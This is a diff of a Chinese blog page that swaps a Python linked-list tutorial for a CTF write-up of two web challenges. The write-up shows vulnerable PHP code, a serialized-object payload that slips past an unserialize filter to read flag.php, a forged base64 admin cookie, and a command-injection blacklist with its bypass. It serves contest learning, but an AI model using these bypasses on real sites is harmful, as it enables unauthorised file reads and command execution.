@@ -15,18 +15,25 @@
 
 
 
-<meta name="description" content="前言 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，">
-<meta name="keywords" content="python,编程语言,数据结构">
+<meta name="description" content="吐槽一下这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了">
+<meta name="keywords" content="CTF,Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="数据结构复习二 双向链表(python实现)">
-<meta property="og:url" content="0verwatch.top/python-DataStruct-2.html">
+<meta property="og:title" content="安恒12月赛Web题解">
+<meta property="og:url" content="0verwatch.top/anheng-12month.html">
 <meta property="og:site_name" content="0verWatch&#39;s Blog">
-<meta property="og:description" content="前言 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，">
+<meta property="og:description" content="吐槽一下这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-06-23T13:32:50.055Z">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/FySZ1H.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/FySHvd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/FySObt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/Fyphss.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/FypvLR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/22/Fypze1.png">
+<meta property="og:updated_time" content="2018-12-22T05:01:32.092Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="数据结构复习二 双向链表(python实现)">
-<meta name="twitter:description" content="前言 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，">
+<meta name="twitter:title" content="安恒12月赛Web题解">
+<meta name="twitter:description" content="吐槽一下这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/12/22/FySZ1H.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -58,7 +65,7 @@
 <link href="//lib.baomitu.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>数据结构复习二 双向链表(python实现) | 0verWatch&#39;s Blog</title>
+<title>安恒12月赛Web题解 | 0verWatch&#39;s Blog</title>
 
 <script src="//lib.baomitu.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//lib.baomitu.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -296,11 +303,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-python-DataStruct-2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-anheng-12month" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/python-DataStruct-2.html" class="article-date">
-      <time datetime="2018-06-17T15:40:35.000Z" itemprop="datePublished">2018-06-17</time>
+      <a href="/anheng-12month.html" class="article-date">
+      <time datetime="2018-12-22T04:58:05.000Z" itemprop="datePublished">2018-12-22</time>
 </a>
 
 
@@ -315,7 +322,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      数据结构复习二 双向链表(python实现)
+      安恒12月赛Web题解
     </h1>
   
 
@@ -324,13 +331,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/编程语言/">编程语言</a>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程语言/">编程语言</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -341,11 +348,29 @@
       
           
         
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，<br> <a id="more"></a>微机(实验写汇编对指令不熟)，计网(子网跟超网的题目还不熟练)，双向链表其实就是比单向链表的节点多了一个前驱结点的部分，虽然简单但是还是在编写时出现问题，出现问题就值得去记录</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>双向链表的实现，这个双向链表比昨天写的多了一点点而而已，头结点的前驱节点默认是<code>None</code>，而且在遍历，搜索以及判空等步骤都是与昨天的写法一样，可以直接尝试<code>import</code>一下昨天的文件，让今天的双向链表继承昨天的单向链表的相同操作<br>(python 3.5实现)</p>
-<p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line">        self.prev = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span> <span class="comment">#这里默认第一个节点的前驱指针指的是None</span></span><br><span class="line">        self.__head = node <span class="comment">#私有化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__head <span class="keyword">is</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem, end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next  <span class="comment">#这两句话顺序不能调换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##其实上面的都不用改</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line">        <span class="keyword">if</span> node.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            node.next.prev = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">               cur = cur.next</span><br><span class="line">            node.next = cur.next</span><br><span class="line">            node.prev = cur</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">             self.add(item)</span><br><span class="line">        <span class="keyword">elif</span> pos &gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            cur = self.__head</span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                cur = cur.next</span><br><span class="line">            node.next = cur</span><br><span class="line">            node.prev = cur.prev</span><br><span class="line">            cur.prev.next = node</span><br><span class="line">            cur.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                    <span class="comment"># 判断链表是否只有一个节点,不是的话就执行这一条件语句</span></span><br><span class="line">                    self.__head = <span class="keyword">None</span></span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        self.__head = cur.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur.prev.next = cur.next</span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        cur.next.prev = cur.prev</span><br><span class="line">                <span class="keyword">break</span>   <span class="comment">#注意下这里的break，不要忘了</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = DoubleLinkList()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3</span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里我记录一下我出现的几个问题<br>第一，各节点的链接操作一定要注意顺序，比如在遍历的时候进入循环后是先进行输出操作，再把指针移到下一位等等<br>第二，每一种操作都要注意考虑单个节点，是否为头结点，尾节点的问题，然后去给出一定的条件去控制，不然很容易出错，在写<code>remove操作</code>的时候我就在考虑完头结点之后就没有考虑是否为单个节点的情况，导致程序出错，<br>第三，注意<code>remove操作</code>的<code>break</code>，这一点我还是用<code>debugger功能</code>一直<code>F7 F8 F9</code>找出来的。。。就发现一直在那个函数里面不出来，一直循环才惊醒要加break，23333<br>早早睡觉，明天早起复习概率论!!!!!!</p>
+<h3 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h3><p>这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了<a id="more"></a>。。。但还是记录一下。</p>
+<h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>这个题目考的是一个php反序列化的一个绕过，上来就给了一段代码，很简单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键是绕过这一句，本意是为了防止对象被反序列化，可以参考一下这篇文章:<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure>
+<p>所以只需要只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。最后的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>url编码后发包就可以获得flag:<code>flag{ad2328a2c3f0933c053fd3c6f28f6143}</code></p>
+<p><img src="https://s1.ax1x.com/2018/12/22/FySZ1H.png" alt="FySZ1H.png"></p>
+<h3 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h3><p>这个题目上来发现没什么线索，只能扫一下目录，发现了一个<code>admin.php</code>，但是进去却回显<code>You are not admin...</code>，这样思路就很明确了，我们需要伪造admin的身份，查一下cookie，果然需要伪造一下，把cookie的值从<code>user</code>-&gt;<code>admin</code>就好，还需base64一下</p>
+<p><img src="https://s1.ax1x.com/2018/12/22/FySHvd.png" alt="FySHvd.png"></p>
+<p>然后就可以进入一个命令执行的页面,输入<code>ls</code>发现有回显，但是很多东西都被过滤了</p>
+<p><img src="https://s1.ax1x.com/2018/12/22/FySObt.png" alt="FySObt.png"></p>
+<p><img src="https://s1.ax1x.com/2018/12/22/Fyphss.png" alt="Fyphss.png"></p>
+<p>可以尝试一下读文件，在<code>config.php</code>发现黑名单</p>
+<p>admin.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">	$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">	$retval = <span class="keyword">array</span>();</span><br><span class="line">	exec($cmd, $retval, $status);</span><br><span class="line">	<span class="comment">// var_dump($retval);</span></span><br><span class="line">	<span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">		$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$res = <span class="string">'error'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure>
+<p>config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>关键是如何绕过这个黑名单去读到flag，这里已经把很多东西都过滤了，但是<code>$</code>以及<code>/</code>都没被过滤，可以很好地执行命令</p>
+<p><img src="https://s1.ax1x.com/2018/12/22/FypvLR.png" alt="FypvLR.png"></p>
+<p>成功读取flag:<code>flag{6f1d95159e3b90ed28186c518dd15e8c}</code></p>
+<p><img src="https://s1.ax1x.com/2018/12/22/Fypze1.png" alt="Fypze1.png"></p>
 
       
     </div>
@@ -354,13 +379,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/python-DataStruct-2.html">数据结构复习二 双向链表(python实现)</a></p>
+        <p><span>本文标题:</span><a href="/anheng-12month.html">安恒12月赛Web题解</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
-        <p><span>发布时间:</span>2018-06-17, 23:40:35</p>
-        <p><span>最后更新:</span>2018-06-23, 21:32:50</p>
+        <p><span>发布时间:</span>2018-12-22, 12:58:05</p>
+        <p><span>最后更新:</span>2018-12-22, 13:01:32</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/python-DataStruct-2.html" title="数据结构复习二 双向链表(python实现)">0verwatch.top/python-DataStruct-2.html</a>
-            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/python-DataStruct-2.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/anheng-12month.html" title="安恒12月赛Web题解">0verwatch.top/anheng-12month.html</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/anheng-12month.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -372,16 +397,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/anheng-6month.html">
-                    安恒6月赛部分做题记录
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/python-DataStruct-1.html">
-                    数据结构复习一 单链表(python实现)
+                <a href="/CUMT-month-race.html">
+                    CUMT第一轮双月赛Web题解
                 </a>
             </div>
         
@@ -423,7 +442,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#吐槽一下"><span class="toc-number">1.</span> <span class="toc-text">吐槽一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy"><span class="toc-number">2.</span> <span class="toc-text">easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezweb2"><span class="toc-number">3.</span> <span class="toc-text">ezweb2</span></a></li></ol>
         
     </div>
     <style>
@@ -485,15 +504,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/anheng-6month.html" title="上一篇: 安恒6月赛部分做题记录">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/python-DataStruct-1.html" title="下一篇: 数据结构复习一 单链表(python实现)">
+            <a href="/CUMT-month-race.html" title="下一篇: CUMT第一轮双月赛Web题解">
                 <i class="fa fa-angle-right"></i>
             </a>
         
